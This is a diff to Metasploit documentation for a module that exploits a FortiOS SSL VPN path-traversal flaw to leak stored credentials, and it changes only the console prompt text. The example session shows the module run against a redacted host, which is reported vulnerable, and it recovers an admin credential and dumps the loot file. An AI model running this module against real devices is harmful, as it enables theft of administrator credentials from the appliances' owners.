@@ -30,8 +30,8 @@ If set, then store gathered credentials into the Metasploit creds database.
 ### FortiOS 6.0
 
 ```
-msf6 > use auxiliary/gather/fortios_vpnssl_traversal_creds_leak
-msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > show options
+msf > use auxiliary/gather/fortios_vpnssl_traversal_creds_leak
+msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > show options
 
 Module options (auxiliary/gather/fortios_vpnssl_traversal_creds_leak):
 
@@ -47,9 +47,9 @@ Module options (auxiliary/gather/fortios_vpnssl_traversal_creds_leak):
    THREADS      1                yes       The number of concurrent threads (max one per host)
    VHOST                         no        HTTP server virtual host
 
-msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > set RHOSTS *redacted*
+msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > set RHOSTS *redacted*
 RHOSTS => *redacted*
-msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > run
+msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > run
 
 [*] https://*redacted*:10443 - Trying to connect.
 [+] https://*redacted*:10443 - Vulnerable!
@@ -57,7 +57,7 @@ msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > run
 [+] https://*redacted*:10443 - 1 credential(s) found!
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > creds
+msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > creds
 Credentials
 ===========
 
@@ -65,10 +65,10 @@ host            origin          service            public  private    realm  pri
 ----            ------          -------            ------  -------    -----  ------------  ----------
 *redacted*  *redacted*  10443/tcp (https)  admin   *redacted*         Password
 
-msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > cat /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
+msf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > cat /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
 [*] exec: cat /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
 
 var fgt_lang =
-�/V^Pҽ�w���V^��V^��V^*redacted*admin*redacted*RemoteUSersfull-accessroot�бmsf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) >
+�/V^Pҽ�w���V^��V^��V^*redacted*admin*redacted*RemoteUSersfull-accessroot�бmsf auxiliary(gather/fortios_vpnssl_traversal_creds_leak) >
 
 ```
